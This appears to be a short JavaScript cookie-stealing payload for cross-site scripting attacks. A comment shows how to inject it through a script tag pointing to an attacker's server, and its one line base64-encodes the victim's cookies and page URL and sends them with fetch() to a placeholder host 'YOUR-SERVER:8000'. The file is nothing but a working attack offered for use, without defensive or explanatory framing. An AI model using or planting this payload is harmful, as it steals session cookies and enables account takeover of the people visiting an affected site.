// Simple cookie stealer
// Usage: <script src="http://your-server:8000/xss/steal-cookie.js"></script>

fetch('http://YOUR-SERVER:8000/xss/cookie?c=' + btoa(document.cookie) + '&u=' + btoa(window.location.href));